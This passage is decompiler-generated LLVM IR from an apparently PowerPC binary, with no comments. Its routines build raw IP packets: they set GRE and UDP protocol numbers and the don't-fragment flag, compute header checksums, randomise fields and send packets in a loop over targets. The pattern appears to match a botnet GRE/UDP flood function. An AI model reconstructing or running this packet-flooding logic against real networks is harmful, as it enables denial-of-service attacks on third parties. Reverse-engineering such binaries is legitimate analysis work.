  store i8 %v1_1000304c, i8* %v4_1000304c, align 1
  %v0_10003050 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003050 = trunc i32 %v0_10003050 to i16
  %v2_10003050 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003050 = add i32 %v2_10003050, 2
  %v4_10003050 = inttoptr i32 %v3_10003050 to i16*
  store i16 %v1_10003050, i16* %v4_10003050, align 2
  %v0_10003054 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003054, label %dec_label_pc_10003060, label %dec_label_pc_10003058

dec_label_pc_10003058:                            ; preds = %dec_label_pc_10003000
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_1000305c = load i32, i32* %r31.global-to-local, align 4
  %v3_1000305c = add i32 %v2_1000305c, 6
  %v4_1000305c = inttoptr i32 %v3_1000305c to i16*
  store i16 16384, i16* %v4_1000305c, align 2
  br label %dec_label_pc_10003060

dec_label_pc_10003060:                            ; preds = %dec_label_pc_10003000, %dec_label_pc_10003058
  store i32 2048, i32* %r0.global-to-local, align 4
  %v2_10003068 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003068 = add i32 %v2_10003068, 9
  %v4_10003068 = inttoptr i32 %v3_10003068 to i8*
  store i8 47, i8* %v4_10003068, align 1
  %v0_1000306c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000306c = trunc i32 %v0_1000306c to i16
  %v2_1000306c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000306c = add i32 %v2_1000306c, 2
  %v4_1000306c = inttoptr i32 %v3_1000306c to i16*
  store i16 %v1_1000306c, i16* %v4_1000306c, align 2
  %v3_10003070 = load i32, i32* %stack_var_-104, align 4
  store i32 %v5_10002f3c, i32* %r11.global-to-local, align 4
  %v1_10003078 = mul i32 %v3_10003070, 24
  store i32 %v1_10003078, i32* %r9.global-to-local, align 4
  %v0_1000307c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000307c = add i32 %v0_1000307c, 24
  %v2_1000307c = inttoptr i32 %v1_1000307c to i32*
  %v3_1000307c = load i32, i32* %v2_1000307c, align 4
  store i32 %v3_1000307c, i32* %r0.global-to-local, align 4
  %v2_10003080 = add i32 %v0_1000307c, 12
  %v3_10003080 = inttoptr i32 %v2_10003080 to i32*
  store i32 %v5_10002f3c, i32* %v3_10003080, align 4
  store i32 4, i32* %r11.global-to-local, align 4
  %v0_10003088 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003088 = load i32, i32* %r26.global-to-local, align 4
  %v2_10003088 = add i32 %v1_10003088, %v0_10003088
  store i32 %v2_10003088, i32* %r9.global-to-local, align 4
  %v1_1000308c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000308c, i32* %r0.global-to-local, align 4
  %v0_10003090 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003090 = add i32 %v0_10003090, 16
  %v2_10003090 = inttoptr i32 %v1_10003090 to i32*
  %v3_10003090 = load i32, i32* %v2_10003090, align 4
  store i32 %v3_10003090, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10003098 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10003098, i32* %r0.global-to-local, align 4
  %v1_1000309c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000309c = add i32 %v1_1000309c, 24
  %v3_1000309c = inttoptr i32 %v2_1000309c to i32*
  store i32 %v1_10003098, i32* %v3_1000309c, align 4
  %v0_100030a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100030a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100030a0 = add i32 %v1_100030a0, 16
  %v3_100030a0 = inttoptr i32 %v2_100030a0 to i32*
  store i32 %v0_100030a0, i32* %v3_100030a0, align 4
  %v0_100030a4 = load i32, i32* %r14.global-to-local, align 4
  %v1_100030a4 = trunc i32 %v0_100030a4 to i8
  %v2_100030a4 = load i32, i32* %r30.global-to-local, align 4
  %v3_100030a4 = add i32 %v2_100030a4, 1
  %v4_100030a4 = inttoptr i32 %v3_100030a4 to i8*
  store i8 %v1_100030a4, i8* %v4_100030a4, align 1
  %v0_100030a8 = load i32, i32* %r24.global-to-local, align 4
  %v1_100030a8 = trunc i32 %v0_100030a8 to i16
  %v2_100030a8 = load i32, i32* %r30.global-to-local, align 4
  %v3_100030a8 = add i32 %v2_100030a8, 2
  %v4_100030a8 = inttoptr i32 %v3_100030a8 to i16*
  store i16 %v1_100030a8, i16* %v4_100030a8, align 2
  %v0_100030ac = load i32, i32* %r27.global-to-local, align 4
  %v1_100030ac = trunc i32 %v0_100030ac to i16
  %v2_100030ac = load i32, i32* %r30.global-to-local, align 4
  %v3_100030ac = add i32 %v2_100030ac, 4
  %v4_100030ac = inttoptr i32 %v3_100030ac to i16*
  store i16 %v1_100030ac, i16* %v4_100030ac, align 2
  %v0_100030b0 = load i32, i32* %r21.global-to-local, align 4
  %v1_100030b0 = trunc i32 %v0_100030b0 to i8
  %v2_100030b0 = load i32, i32* %r30.global-to-local, align 4
  %v3_100030b0 = add i32 %v2_100030b0, 8
  %v4_100030b0 = inttoptr i32 %v3_100030b0 to i8*
  store i8 %v1_100030b0, i8* %v4_100030b0, align 1
  %v0_100030b4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100030b4, label %dec_label_pc_100030c0, label %dec_label_pc_100030b8

dec_label_pc_100030b8:                            ; preds = %dec_label_pc_10003060
  store i32 16384, i32* %r11.global-to-local, align 4
  %v2_100030bc = load i32, i32* %r30.global-to-local, align 4
  %v3_100030bc = add i32 %v2_100030bc, 6
  %v4_100030bc = inttoptr i32 %v3_100030bc to i16*
  store i16 16384, i16* %v4_100030bc, align 2
  br label %dec_label_pc_100030c0

dec_label_pc_100030c0:                            ; preds = %dec_label_pc_10003060, %dec_label_pc_100030b8
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_100030c4 = load i32, i32* %r30.global-to-local, align 4
  %v3_100030c4 = add i32 %v2_100030c4, 9
  %v4_100030c4 = inttoptr i32 %v3_100030c4 to i8*
  store i8 17, i8* %v4_100030c4, align 1
  %v0_100030c8 = call i32 @function_10007ca8()
  store i32 %v0_100030c8, i32* %r3.global-to-local, align 4
  %v1_100030cc = add i32 %v0_100030c8, -1024
  store i32 %v1_100030cc, i32* %r0.global-to-local, align 4
  %v1_100030d0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100030d0 = add i32 %v1_100030d0, 12
  %v3_100030d0 = inttoptr i32 %v2_100030d0 to i32*
  store i32 %v0_100030c8, i32* %v3_100030d0, align 4
  %v0_100030d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100030d4 = sub i32 -1, %v0_100030d4
  store i32 %v1_100030d4, i32* %r0.global-to-local, align 4
  %v0_100030d8 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100030d8, label %dec_label_pc_100030dc, label %dec_label_pc_10002fd8

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030c0
  %v1_100030dc = load i32, i32* %r30.global-to-local, align 4
  %v2_100030dc = add i32 %v1_100030dc, 16
  %v3_100030dc = inttoptr i32 %v2_100030dc to i32*
  store i32 %v1_100030d4, i32* %v3_100030dc, align 4
  br label %dec_label_pc_10002fe0

dec_label_pc_100030e4:                            ; preds = %dec_label_pc_10002f60
  %v0_100030e4 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100030e4, i32* %r3.global-to-local, align 4
  store i32 268447980, i32* @lr, align 4
  %v0_100030e8 = call i32 @function_1000b3f0()
  store i32 %v0_100030e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100030ec

dec_label_pc_100030ec:                            ; preds = %dec_label_pc_10002dcc, %dec_label_pc_100030e4
  store i32 %v0_10002de4, i32* %r0.global-to-local, align 4
  %v1_10003100 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002dd4)
  store i32 %v0_10002e18, i32* %r28.global-to-local, align 4
  store i32 %v0_10002e20, i32* %r29.global-to-local, align 4
  store i32 %v0_10002e28, i32* %r30.global-to-local, align 4
  store i32 %v0_10002e2c, i32* %r31.global-to-local, align 4
  %v0_10003148 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003148

dec_label_pc_1000314c:                            ; preds = %dec_label_pc_10002f84
  %v3_1000314c = icmp eq i32 %v1_10002f9c, 0
  store i1 %v3_1000314c, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10003150

dec_label_pc_10003150:                            ; preds = %dec_label_pc_10002fe0, %dec_label_pc_1000314c
  store i32 %v5_10002f3c, i32* %r0.global-to-local, align 4
  %v0_10003154 = load i32, i32* %r15.global-to-local, align 4
  %v3_10003154 = icmp eq i32 %v0_10003154, 0
  store i1 %v3_10003154, i1* %cr2_eq.global-to-local, align 1
  %v0_10003158 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003158 = add i32 %v0_10003158, 8
  store i32 %v1_10003158, i32* %r22.global-to-local, align 4
  %v1_1000315c = add i32 %v0_10003158, 52
  store i32 %v1_1000315c, i32* %r24.global-to-local, align 4
  %v3_10003160 = icmp eq i32 %v5_10002f3c, -1
  store i1 %v3_10003160, i1* %cr7_eq.global-to-local, align 1
  %v0_10003164 = call i32 @__asm_mfcr()
  store i32 %v0_10003164, i32* %r3.global-to-local, align 4
  %v1_10003168 = mul i32 %v0_10003164, 268435456
  store i32 %v1_10003168, i32* %r21.global-to-local, align 4
  %v0_1000316c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_1000316c.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_1000316c.outer

dec_label_pc_1000316c.outer:                      ; preds = %dec_label_pc_10003274, %dec_label_pc_10003150
  %v1_1000316c.ph = phi i1 [ %v1_1000316c.pre, %dec_label_pc_10003150 ], [ %v1_10003274, %dec_label_pc_10003274 ]
  %v0_1000316c.ph = phi i1 [ %v0_1000316c.pre, %dec_label_pc_10003150 ], [ %v0_10003274, %dec_label_pc_10003274 ]
  %v2_1000316c = or i1 %v1_1000316c.ph, %v0_1000316c.ph
  br label %dec_label_pc_1000316c

dec_label_pc_1000316c:                            ; preds = %dec_label_pc_1000316c.outer, %dec_label_pc_1000316c
  br i1 %v2_1000316c, label %dec_label_pc_1000316c, label %dec_label_pc_10003170

dec_label_pc_10003170:                            ; preds = %dec_label_pc_1000316c, %dec_label_pc_10003274
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10003180

dec_label_pc_10003180:                            ; preds = %dec_label_pc_100031e4, %dec_label_pc_10003170
  %v0_10003180 = phi i32 [ %v1_10003264, %dec_label_pc_100031e4 ], [ 0, %dec_label_pc_10003170 ]
  %v1_10003180 = mul i32 %v0_10003180, 24
  store i32 %v1_10003180, i32* %r0.global-to-local, align 4
  %v1_10003184 = mul i32 %v0_10003180, 4
  store i32 %v1_10003184, i32* %r11.global-to-local, align 4
  %v1_10003188 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003188 = add i32 %v1_10003188, %v1_10003184
  %v3_10003188 = inttoptr i32 %v2_10003188 to i32*
  %v4_10003188 = load i32, i32* %v3_10003188, align 4
  store i32 %v4_10003188, i32* %r28.global-to-local, align 4
  %v1_1000318c = load i32, i32* %r26.global-to-local, align 4
  %v2_1000318c = add i32 %v1_1000318c, %v1_10003180
  %v1_10003190 = add i32 %v2_1000318c, 20
  %v2_10003190 = inttoptr i32 %v1_10003190 to i8*
  %v3_10003190 = load i8, i8* %v2_10003190, align 1
  %v4_10003190 = zext i8 %v3_10003190 to i32
  store i32 %v4_10003190, i32* %r9.global-to-local, align 4
  %v1_10003194 = add i32 %v4_10003188, 24
  store i32 %v1_10003194, i32* @r31, align 4
  %v1_10003198 = add i32 %v4_10003188, 44
  store i32 %v1_10003198, i32* @r30, align 4
  %v3_1000319c = icmp eq i8 %v3_10003190, 31
  store i1 %v3_1000319c, i1* %cr7_eq.global-to-local, align 1
  %tmp35 = icmp ult i8 %v3_10003190, 32
  br i1 %tmp35, label %dec_label_pc_1000327c, label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003180
  %v0_100031a4 = load i32, i32* %r21.global-to-local, align 4
  %v1_100031a4 = mul i32 %v0_100031a4, 16
  %v2_100031a4 = udiv i32 %v0_100031a4, 268435456
  %v3_100031a4 = or i32 %v2_100031a4, %v1_100031a4
  store i32 %v3_100031a4, i32* %r21.global-to-local, align 4
  %v1_100031a8 = call %0 @__asm_mtcrf(i32 1, i32 %v3_100031a4)
  %v1_100031ac = mul nuw i32 %v2_100031a4, 268435456
  %v2_100031ac = urem i32 %v0_100031a4, 268435456
  %v3_100031ac = or i32 %v1_100031ac, %v2_100031ac
  store i32 %v3_100031ac, i32* %r21.global-to-local, align 4
  %v0_100031b0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100031b0, label %dec_label_pc_100032b0, label %dec_label_pc_100031b4

dec_label_pc_100031b4:                            ; preds = %dec_label_pc_1000327c, %dec_label_pc_100031a4
  store i32 65535, i32* @r29, align 4
  %v0_100031bc = load i32, i32* %r25.global-to-local, align 4
  %v4_100031bc = icmp eq i32 %v0_100031bc, 65535
  store i1 %v4_100031bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100031bc, label %dec_label_pc_100032c8, label %dec_label_pc_100031c4

dec_label_pc_100031c4:                            ; preds = %dec_label_pc_100032b0, %dec_label_pc_100031b4
  %v1_100031c4 = phi i32 [ %v1_100032c0, %dec_label_pc_100032b0 ], [ 65535, %dec_label_pc_100031b4 ]
  %v0_100031c4 = load i32, i32* %r17.global-to-local, align 4
  %v4_100031c4 = icmp eq i32 %v0_100031c4, %v1_100031c4
  store i1 %v4_100031c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100031c4, label %dec_label_pc_100032e8, label %dec_label_pc_100031cc

dec_label_pc_100031cc:                            ; preds = %dec_label_pc_100032c8.dec_label_pc_100031cc_crit_edge, %dec_label_pc_100031c4
  %v1_100031cc = phi i32 [ %v1_100031cc.pre, %dec_label_pc_100032c8.dec_label_pc_100031cc_crit_edge ], [ %v1_100031c4, %dec_label_pc_100031c4 ]
  %v0_100031cc = load i32, i32* %r18.global-to-local, align 4
  %v4_100031cc = icmp eq i32 %v0_100031cc, %v1_100031cc
  store i1 %v4_100031cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100031cc, label %dec_label_pc_100032f8, label %dec_label_pc_100031d4

dec_label_pc_100031d4:                            ; preds = %dec_label_pc_100032e8, %dec_label_pc_100031cc
  %v0_100031d4 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100031d4, label %dec_label_pc_10003304, label %dec_label_pc_100031d8

dec_label_pc_100031d8:                            ; preds = %dec_label_pc_100032f8, %dec_label_pc_100031d4
  %v0_100031d8 = load i32, i32* %r28.global-to-local, align 4
  %v1_100031d8 = add i32 %v0_100031d8, 16
  %v2_100031d8 = inttoptr i32 %v1_100031d8 to i32*
  %v3_100031d8 = load i32, i32* %v2_100031d8, align 4
  store i32 %v3_100031d8, i32* %r0.global-to-local, align 4
  %v1_100031dc = load i32, i32* @r31, align 4
  %v2_100031dc = add i32 %v1_100031dc, 16
  %v3_100031dc = inttoptr i32 %v2_100031dc to i32*
  store i32 %v3_100031d8, i32* %v3_100031dc, align 4
  %v0_100031e0 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100031e0, label %dec_label_pc_100031e4, label %dec_label_pc_10003310

dec_label_pc_100031e4:                            ; preds = %dec_label_pc_100031d8, %dec_label_pc_10003304, %dec_label_pc_10003310
  %v0_100031e4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100031e4 = trunc i32 %v0_100031e4 to i16
  %v2_100031e4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100031e4 = add i32 %v2_100031e4, 10
  %v4_100031e4 = inttoptr i32 %v3_100031e4 to i16*
  store i16 %v1_100031e4, i16* %v4_100031e4, align 2
  %v0_100031ec = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100031ec, i32* @r3, align 4
  %v2_100031f0 = call i32 @function_100060d4(i32 %v0_100031ec, i32 20)
  %v3_100031f0 = trunc i32 %v2_100031f0 to i16
  %v4_100031f8 = add i32 %v0_100031ec, 10
  %v5_100031f8 = inttoptr i32 %v4_100031f8 to i16*
  store i16 %v3_100031f0, i16* %v5_100031f8, align 2
  %v0_100031fc = load i32, i32* @r31, align 4
  store i32 %v0_100031fc, i32* @r3, align 4
  %v0_10003200 = load i32, i32* %r27.global-to-local, align 4
  %v1_10003200 = trunc i32 %v0_10003200 to i16
  %v3_10003200 = add i32 %v0_100031fc, 10
  %v4_10003200 = inttoptr i32 %v3_10003200 to i16*
  store i16 %v1_10003200, i16* %v4_10003200, align 2
  %v2_10003204 = call i32 @function_100060d4(i32 %v0_100031fc, i32 20)
  %v3_10003204 = trunc i32 %v2_10003204 to i16
  %v0_10003208 = load i32, i32* @r30, align 4
  store i32 %v0_10003208, i32* @r4, align 4
  %v3_1000320c = load i32, i32* @r31, align 4
  %v4_1000320c = add i32 %v3_1000320c, 10
  %v5_1000320c = inttoptr i32 %v4_1000320c to i16*
  store i16 %v3_10003204, i16* %v5_1000320c, align 2
  %v0_10003210 = load i32, i32* %r22.global-to-local, align 4
  %v0_10003214 = load i32, i32* %r27.global-to-local, align 4
  %v1_10003214 = trunc i32 %v0_10003214 to i16
  %v2_10003214 = load i32, i32* @r30, align 4
  %v3_10003214 = add i32 %v2_10003214, 6
  %v4_10003214 = inttoptr i32 %v3_10003214 to i16*
  store i16 %v1_10003214, i16* %v4_10003214, align 2
  %v0_10003218 = load i32, i32* @r31, align 4
  store i32 %v0_10003218, i32* %r3.global-to-local, align 4
  %v0_1000321c = load i32, i32* @r30, align 4
  %v1_1000321c = add i32 %v0_1000321c, 4
  %v2_1000321c = inttoptr i32 %v1_1000321c to i16*
  %v3_1000321c = load i16, i16* %v2_1000321c, align 2
  %v4_1000321c = zext i16 %v3_1000321c to i32
  %v4_10003220 = call i32 @function_10006138(i32 %v0_10003218, i32 %v0_10003208, i32 %v4_1000321c, i32 %v0_10003210)
  %v5_10003220 = trunc i32 %v4_10003220 to i16
  store i32 %v4_10003220, i32* %r3.global-to-local, align 4
  %v3_10003224 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10003224, i32* %r0.global-to-local, align 4
  %v0_10003228 = load i32, i32* %r28.global-to-local, align 4
  %v1_10003228 = add i32 %v0_10003228, 16
  %v2_10003228 = inttoptr i32 %v1_10003228 to i32*
  %v3_10003228 = load i32, i32* %v2_10003228, align 4
  store i32 %v3_10003228, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10003230 = mul i32 %v3_10003224, 24
  store i32 %v1_10003230, i32* %r0.global-to-local, align 4
  %v3_10003234 = load i32, i32* @r30, align 4
  %v4_10003234 = add i32 %v3_10003234, 6
  %v5_10003234 = inttoptr i32 %v4_10003234 to i16*
  store i16 %v5_10003220, i16* %v5_10003234, align 2
  %v0_10003238 = load i32, i32* %r28.global-to-local, align 4
  %v0_1000323c = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000323c, i32* %r3.global-to-local, align 4
  %v0_10003240 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003240 = load i32, i32* %r26.global-to-local, align 4
  %v2_10003240 = add i32 %v1_10003240, %v0_10003240
  %v0_10003244 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003244 = trunc i32 %v0_10003244 to i16
  %v5_10003244 = inttoptr i32 %v2_10003240 to i16*
  store i16 %v3_10003244, i16* %v5_10003244, align 2
  %v0_10003248 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003248 = add i32 %v2_10003240, 4
  %v3_10003248 = inttoptr i32 %v2_10003248 to i32*
  store i32 %v0_10003248, i32* %v3_10003248, align 4
  %v0_1000324c = load i32, i32* %r24.global-to-local, align 4
  %v0_10003250 = load i32, i32* %r27.global-to-local, align 4
  %v1_10003250 = trunc i32 %v0_10003250 to i16
  %v3_10003250 = add i32 %v2_10003240, 2
  %v4_10003250 = inttoptr i32 %v3_10003250 to i16*
  store i16 %v1_10003250, i16* %v4_10003250, align 2
  store i32 268448352, i32* @lr, align 4
  %v6_1000325c = call i32 @function_1000c140(i32 %v0_1000323c, i32 %v0_10003238, i32 %v0_1000324c, i32 16384, i32 %v2_10003240, i32 16)
  store i32 %v6_1000325c, i32* %r3.global-to-local, align 4
  %v3_10003260 = load i32, i32* %stack_var_-104, align 4
  %v1_10003264 = add i32 %v3_10003260, 1
  store i32 %v1_10003264, i32* %r9.global-to-local, align 4
  %v1_10003268 = load i32, i32* %r19.global-to-local, align 4
  %v2_10003268 = icmp slt i32 %v1_10003264, %v1_10003268
  %v4_10003268 = icmp eq i32 %v1_10003264, %v1_10003268
  store i1 %v4_10003268, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003264, i32* %stack_var_-104, align 4
  br i1 %v2_10003268, label %dec_label_pc_10003180, label %dec_label_pc_10003274

dec_label_pc_10003274:                            ; preds = %dec_label_pc_100031e4
  %v0_10003274 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10003274 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10003274 = or i1 %v0_10003274, %v1_10003274
  br i1 %v2_10003274, label %dec_label_pc_1000316c.outer, label %dec_label_pc_10003170

dec_label_pc_1000327c:                            ; preds = %dec_label_pc_10003180
  %v1_1000327c = add i32 %v2_1000318c, 16
  %v2_1000327c = inttoptr i32 %v1_1000327c to i32*
  %v3_1000327c = load i32, i32* %v2_1000327c, align 4
  store i32 %v3_1000327c, i32* %r29.global-to-local, align 4
  %v0_10003280 = call i32 @function_10007ca8()
  store i32 %v0_10003280, i32* %r3.global-to-local, align 4
  %v3_10003284 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10003284, i32* %r9.global-to-local, align 4
  %v0_10003288 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003288 = mul i32 %v0_10003288, 16
  %v2_10003288 = udiv i32 %v0_10003288, 268435456
  %v3_10003288 = or i32 %v2_10003288, %v1_10003288
  store i32 %v3_10003288, i32* %r21.global-to-local, align 4
  %v1_1000328c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003288)
  %v1_10003290 = mul nuw i32 %v2_10003288, 268435456
  %v2_10003290 = urem i32 %v0_10003288, 268435456
  %v3_10003290 = or i32 %v1_10003290, %v2_10003290
  store i32 %v3_10003290, i32* %r21.global-to-local, align 4
  %v0_10003294 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003294 = mul i32 %v0_10003294, 24
  %v1_10003298 = load i32, i32* %r26.global-to-local, align 4
  %v2_10003298 = add i32 %v1_10003298, %v1_10003294
  store i32 %v2_10003298, i32* %r9.global-to-local, align 4
  %v1_1000329c = add i32 %v2_10003298, 20
  %v2_1000329c = inttoptr i32 %v1_1000329c to i8*
  %v3_1000329c = load i8, i8* %v2_1000329c, align 1
  %v4_1000329c = zext i8 %v3_1000329c to i32
  store i32 %v4_1000329c, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_1000329c, 64
  %v2_100032a0 = zext i8 %tmp to i32
  %v3_100032a0 = lshr i32 %v0_10003280, %v2_100032a0
  store i32 %v3_100032a0, i32* %r3.global-to-local, align 4
  %v0_100032a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100032a4 = add i32 %v3_100032a0, %v0_100032a4
  store i32 %v2_100032a4, i32* %r29.global-to-local, align 4
  %v1_100032a8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100032a8 = add i32 %v1_100032a8, 16
  %v3_100032a8 = inttoptr i32 %v2_100032a8 to i32*
  store i32 %v2_100032a4, i32* %v3_100032a8, align 4
  %v0_100032ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100032ac, label %dec_label_pc_100032b0, label %dec_label_pc_100031b4

dec_label_pc_100032b0:                            ; preds = %dec_label_pc_1000327c, %dec_label_pc_100031a4
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_100032b4 = call i32 @function_10007ca8()
  store i32 %v0_100032b4, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_100032bc = load i32, i32* %r28.global-to-local, align 4
  %v2_100032bc = add i32 %v1_100032bc, 12
  %v3_100032bc = inttoptr i32 %v2_100032bc to i32*
  store i32 %v0_100032b4, i32* %v3_100032bc, align 4
  %v0_100032c0 = load i32, i32* %r25.global-to-local, align 4
  %v1_100032c0 = load i32, i32* @r29, align 4
  %v4_100032c0 = icmp eq i32 %v0_100032c0, %v1_100032c0
  store i1 %v4_100032c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100032c0, label %dec_label_pc_100032c8, label %dec_label_pc_100031c4

dec_label_pc_100032c8:                            ; preds = %dec_label_pc_100032b0, %dec_label_pc_100031b4
  %v0_100032c8 = call i32 @function_10007ca8()
  %v0_100032cc = load i32, i32* %r17.global-to-local, align 4
  %v1_100032cc = load i32, i32* @r29, align 4
  %v4_100032cc = icmp eq i32 %v0_100032cc, %v1_100032cc
  store i1 %v4_100032cc, i1* %cr7_eq.global-to-local, align 1
  %v1_100032d0 = urem i32 %v0_100032c8, 65536
  store i32 %v1_100032d0, i32* %r3.global-to-local, align 4
  %v1_100032d4 = add nsw i32 %v1_100032d0, -1000
  store i32 %v1_100032d4, i32* %r0.global-to-local, align 4
  %v1_100032d8 = trunc i32 %v0_100032c8 to i16
  %v2_100032d8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100032d8 = add i32 %v2_100032d8, 4
  %v4_100032d8 = inttoptr i32 %v3_100032d8 to i16*
  store i16 %v1_100032d8, i16* %v4_100032d8, align 2
  %v0_100032dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100032dc = sub i32 -1, %v0_100032dc
  store i32 %v1_100032dc, i32* %r0.global-to-local, align 4
  %v1_100032e0 = trunc i32 %v1_100032dc to i16
  %v2_100032e0 = load i32, i32* @r31, align 4
  %v3_100032e0 = add i32 %v2_100032e0, 4
  %v4_100032e0 = inttoptr i32 %v3_100032e0 to i16*
  store i16 %v1_100032e0, i16* %v4_100032e0, align 2
  br i1 %v4_100032cc, label %dec_label_pc_100032e8, label %dec_label_pc_100032c8.dec_label_pc_100031cc_crit_edge

dec_label_pc_100032c8.dec_label_pc_100031cc_crit_edge: ; preds = %dec_label_pc_100032c8
  %v1_100031cc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100031cc

dec_label_pc_100032e8:                            ; preds = %dec_label_pc_100032c8, %dec_label_pc_100031c4
  %v0_100032e8 = call i32 @function_10007ca8()
  %v1_100032e8 = trunc i32 %v0_100032e8 to i16
  store i32 %v0_100032e8, i32* %r3.global-to-local, align 4
  %v0_100032ec = load i32, i32* %r18.global-to-local, align 4
  %v1_100032ec = load i32, i32* @r29, align 4
  %v4_100032ec = icmp eq i32 %v0_100032ec, %v1_100032ec
  store i1 %v4_100032ec, i1* %cr7_eq.global-to-local, align 1
  %v3_100032f0 = load i32, i32* %r28.global-to-local, align 4
  %v4_100032f0 = add i32 %v3_100032f0, 44
  %v5_100032f0 = inttoptr i32 %v4_100032f0 to i16*
  store i16 %v1_100032e8, i16* %v5_100032f0, align 2
  br i1 %v4_100032ec, label %dec_label_pc_100032f8, label %dec_label_pc_100031d4

dec_label_pc_100032f8:                            ; preds = %dec_label_pc_100032e8, %dec_label_pc_100031cc
  %v0_100032f8 = call i32 @function_10007ca8()
  %v1_100032f8 = trunc i32 %v0_100032f8 to i16
  store i32 %v0_100032f8, i32* %r3.global-to-local, align 4
  %v3_100032fc = load i32, i32* @r30, align 4
  %v4_100032fc = add i32 %v3_100032fc, 2
  %v5_100032fc = inttoptr i32 %v4_100032fc to i16*
  store i16 %v1_100032f8, i16* %v5_100032fc, align 2
  %v0_10003300 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003300, label %dec_label_pc_10003304, label %dec_label_pc_100031d8

dec_label_pc_10003304:                            ; preds = %dec_label_pc_100032f8, %dec_label_pc_100031d4
  %v0_10003304 = call i32 @function_10007ca8()
  store i32 %v0_10003304, i32* %r3.global-to-local, align 4
  %v1_10003308 = load i32, i32* @r31, align 4
  %v2_10003308 = add i32 %v1_10003308, 16
  %v3_10003308 = inttoptr i32 %v2_10003308 to i32*
  store i32 %v0_10003304, i32* %v3_10003308, align 4
  %v0_1000330c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_1000330c, label %dec_label_pc_100031e4, label %dec_label_pc_10003310

dec_label_pc_10003310:                            ; preds = %dec_label_pc_100031d8, %dec_label_pc_10003304
  %v0_10003310 = load i32, i32* @r30, align 4
  %v1_10003310 = add i32 %v0_10003310, 8
  store i32 %v1_10003310, i32* @r3, align 4
  %v0_10003314 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10003314, i32* @r4, align 4
  %v0_10003318 = call i32 @function_10007ed4()
  store i32 %v0_10003318, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100031e4

; uselistorder directives
  uselistorder i32 %v0_100032f8, { 1, 0 }
  uselistorder i32 %v0_100032e8, { 1, 0 }
  uselistorder i32 %v1_100032dc, { 1, 0 }
  uselistorder i32 %v1_100032d0, { 1, 0 }
  uselistorder i32 %v0_100032c8, { 1, 0 }
  uselistorder i32 %v1_100032c0, { 1, 0 }
  uselistorder i32 %v0_10003288, { 2, 1, 0 }
  uselistorder i1 %v1_10003274, { 1, 0 }
